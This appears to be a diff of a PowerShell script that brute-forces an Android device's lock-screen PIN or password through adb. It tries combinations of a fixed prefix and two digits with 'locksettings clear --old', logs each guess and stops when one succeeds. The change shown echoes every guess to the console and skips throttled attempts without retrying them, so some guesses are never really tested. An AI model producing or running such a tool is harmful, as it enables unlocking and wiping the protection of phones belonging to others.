@@ -19,9 +19,10 @@ for ($randomPart1 = 9; $randomPart1 -ge 0; $randomPart1--) {
         # Generate the complete password
         $password = "$fixedPart$randomPart1$randomPart2"
         
-        # Prepare test information to log
+        # Log the current password we are trying
         $logMessage = "Trying password: $password"
         $logMessage | Out-File -Append -FilePath $logFilePath
+        Write-Host "Trying password: $password" -ForegroundColor Cyan  # Displaying the password on the console
 
         # Use adb to clear the lock settings
         $command = & "C:\Users\r\Downloads\platform-tools\adb.exe" shell locksettings clear --old $password 2>&1
@@ -37,13 +38,10 @@ for ($randomPart1 = 9; $randomPart1 -ge 0; $randomPart1--) {
             Write-Host $successMessage -ForegroundColor Green
             break 2  # Exit both loops
         } elseif ($command -like "*Request throttled*") {
-            # Increase wait time after each throttle
-            $waitTime = 30  # Exponential backoff
-            $throttleMessage = "Request throttled, waiting $waitTime seconds to retry..."
+            # Log throttling but immediately skip to next password
+            $throttleMessage = "Request throttled, skipping to next password..."
             $throttleMessage | Out-File -Append -FilePath $logFilePath
             Write-Host $throttleMessage -ForegroundColor Yellow
-            Start-Sleep -Seconds $waitTime  # Wait for the specified time
-            $randomPart2++  # Retry the same password (keep the same combination)
         } else {
             # Log unmatched cases
             $unmatchedMessage = "Unmatched output: $command"
